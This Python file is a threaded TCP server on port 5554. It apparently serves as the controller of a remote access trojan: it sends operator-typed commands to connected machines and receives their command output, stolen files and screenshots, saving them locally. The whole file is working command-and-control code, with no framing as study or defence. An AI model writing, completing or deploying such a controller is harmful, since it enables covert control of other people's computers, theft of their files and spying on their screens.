import socket
import threading

class App:
    def __init__(self):
        self.port = 5554
        self.socket = None
        self.clients = {}
        
    def run(self):
        try:
            self.socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
            self.socket.bind(("0.0.0.0", self.port))
            self.socket.listen(10) #max clients
            print("server now online")
            print("send a command to the connected client : ")
        except Exception as e:
            print("error while creating server : ", e)
            
        while True:
            try:
                client, client_addr = self.socket.accept()
                
                self.clients[client_addr] = threading.Thread(target=self.client, args=(client, client_addr, ))
                self.clients[client_addr].start()
                
            except Exception as e:
                print("error : ", e)
        

        
    def client(self, client, client_addr):
        running = True
        while running:
            try:
                msg_out = ""
                msg_out = input("[" + client_addr[0] + "/" + str(client_addr[1]) + "] >")
                client.send(msg_out.encode())
                
                recv_header = client.recv(4096).decode()
                
                print("reveiced : ")
                if recv_header.startswith("FILE"):
                    try:
                        header = recv_header.split(":")
                        print(f"receiving file : {header[1]}")
                        print(f"file size : {int(header[2])} bytes")
                        
                        recv_file = b""
                        while len(recv_file) < int(header[2]):
                            chunk = client.recv(4096)
                            if not chunk:
                                break
                            recv_file += chunk
                            print(f"Received {len(recv_file)}/{int(header[2])} bytes")
                            
                        with open(f"received_{header[1]}", "wb") as f:
                            f.write(recv_file)
                            
                        print(f"filed saved as : received_{header[1]}")
                    except Exception as e:
                        print("error while downloading file : ", e)
                        
                elif recv_header.startswith("IMG"):
                    try:
                        header = recv_header.split(":")
                        img_size = int(header[1])
                        img_data = b""
                        
                        while len(img_data) < img_size:
                            packet = client.recv(4096)
                            if not packet:
                                break
                            img_data += packet
                        
                        with open("screenshot.png", "wb") as f:
                            f.write(img_data)
                        
                        print("screenshot received and saved as screenshot.png")
                    except Exception as e:
                        print("error while downloading screenshot : ", e)
                        
                else:
                    msg = client.recv(4096).decode()
                    print(msg)
            
            except:
                running = False
                break
            
        client.close()
                

if __name__ == "__main__":
    app = App()
    app.run()
